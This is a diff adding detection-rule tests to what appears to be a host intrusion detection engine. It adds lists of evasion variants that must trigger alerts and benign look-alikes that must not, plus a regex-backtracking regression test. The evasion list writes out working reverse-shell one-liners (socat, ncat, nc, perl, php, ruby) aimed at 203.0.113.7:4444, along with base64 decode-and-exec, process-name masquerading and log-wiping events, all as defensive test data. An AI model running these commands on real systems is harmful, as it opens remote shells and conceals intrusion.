@@ -55,6 +55,7 @@ def ev(
     exe: str | None = None,
     fpath: str | None = None,
     fmode: str | None = None,
+    fsize: int | None = None,
     ts: datetime | None = None,
 ) -> Event:
     """Build a minimal Event for rule testing."""
@@ -72,7 +73,7 @@ def ev(
         source=Source(ip=ip, port=port, user=user),
         destination=Destination(port=dport),
         process=Process(command_line=cmd, executable=exe),
-        file=File(path=fpath, mode=fmode) if fpath is not None else None,
+        file=File(path=fpath, mode=fmode, size=fsize) if fpath is not None else None,
         message="event",
     )
 
@@ -214,3 +215,79 @@ def test_world_writable_ignores_deleted_files() -> None:
     # The exposure ends when the file is gone; the deletion is not the finding.
     deleted = ev("file_deleted", _FILE, fpath="/etc/app.conf", fmode="0666")
     assert "world-writable-sensitive" not in _fired_ids(DetectionEngine(RULES), [deleted])
+
+
+def _cmd(command_line: str, exe: str | None = None) -> Event:
+    return ev("process_started", _PROC, cmd=command_line, exe=exe)
+
+
+# Variants of each technique that slipped past the rules (detection review).
+EVASIONS: list[tuple[str, Event]] = [
+    ("interactive-shell-spawn", _cmd("bash -li")),
+    ("interactive-shell-spawn", _cmd("bash -l -i")),
+    ("interactive-shell-spawn", _cmd("[kworker] -i", exe="/usr/bin/bash")),  # exec -a
+    ("reverse-shell-process", _cmd("bash -li")),
+    ("reverse-shell-process", _cmd("socat tcp:203.0.113.7:4444 exec:'bash -li',pty,stderr")),
+    ("reverse-shell-process", _cmd("ncat 203.0.113.7 4444 --exec /bin/sh")),
+    ("reverse-shell-process", _cmd("nc -c /bin/sh 203.0.113.7 4444")),
+    ("reverse-shell-process", _cmd("nc -nve /bin/sh 203.0.113.7 4444")),
+    ("reverse-shell-process", _cmd("[kworker] -i", exe="/bin/sh")),
+    (
+        "reverse-shell-process",
+        _cmd("perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,0);connect(S,$a)'"),
+    ),
+    ("reverse-shell-process", _cmd("php -r '$s=fsockopen(\"203.0.113.7\",4444);'")),
+    ("reverse-shell-process", _cmd("ruby -rsocket -e 'TCPSocket.open(\"h\",4444)'")),
+    ("base64-execution", _cmd("base64 -di payload.b64")),
+    ("base64-execution", _cmd("base64 --deco payload.b64")),
+    ("base64-execution", _cmd("openssl base64 -d -in payload.b64")),
+    ("base64-execution", _cmd('python3 -c \'exec(__import__("base64").b64decode("cHJp"))\'')),
+    (
+        "new-suid-binary",
+        ev("file_attributes_modified", _FILE, fpath="/usr/local/bin/x", fmode="2755"),
+    ),
+    ("log-tampering", ev("file_modified", _FILE, fpath="/var/log/auth.log", fsize=0)),
+    ("passwd-file-modified", ev("file_created", _FILE, fpath="/etc/passwd")),
+]
+
+# Benign look-alikes the widened patterns must still leave alone.
+LOOK_ALIKES: list[tuple[str, Event]] = [
+    ("interactive-shell-spawn", _cmd("bash -lc 'make test'")),
+    ("interactive-shell-spawn", _cmd("sh -c 'sort -i data.txt'", exe="/bin/sh")),
+    ("reverse-shell-process", _cmd("nc -zv db.internal 5432")),
+    ("reverse-shell-process", _cmd("ncat --ssl -l 8443")),
+    ("base64-execution", _cmd("base64 -w0 report.pdf")),
+    ("new-suid-binary", ev("file_attributes_modified", _FILE, fpath="/tmp/x", fmode="1777")),
+    ("log-tampering", ev("file_modified", _FILE, fpath="/var/log/auth.log", fsize=4096)),
+    ("log-tampering", ev("file_deleted", _FILE, fpath="/var/logs-archive/old.gz")),
+]
+
+
+@pytest.mark.security
+@pytest.mark.parametrize(("rule_id", "event"), EVASIONS)
+def test_known_evasions_still_fire(rule_id: str, event: Event) -> None:
+    assert rule_id in _fired_ids(DetectionEngine(RULES), [event])
+
+
+@pytest.mark.parametrize(("rule_id", "event"), LOOK_ALIKES)
+def test_look_alikes_stay_silent(rule_id: str, event: Event) -> None:
+    assert rule_id not in _fired_ids(DetectionEngine(RULES), [event])
+
+
+@pytest.mark.security
+def test_no_rule_pattern_backtracks_on_hostile_command_lines() -> None:
+    # Regression: `\bnc\b.*\s-e` was quadratic; "nc " repeated to the clip
+    # length took up to 1 s (beyond the 100 ms timeout). Every library pattern
+    # must decide such inputs in time — an incomplete evaluation fires the
+    # rule, so a slow pattern would turn into noise.
+    hostile = [
+        "nc " * 3_300,
+        "python " * 1_400,
+        "bash -l" * 1_400,
+        "base64 " * 1_400,
+        "socat " * 1_600,
+    ]
+    engine = DetectionEngine(RULES)
+    for command_line in hostile:
+        engine.evaluate(_cmd(command_line[:10_000]))
+    assert engine.stats["incomplete"] == 0
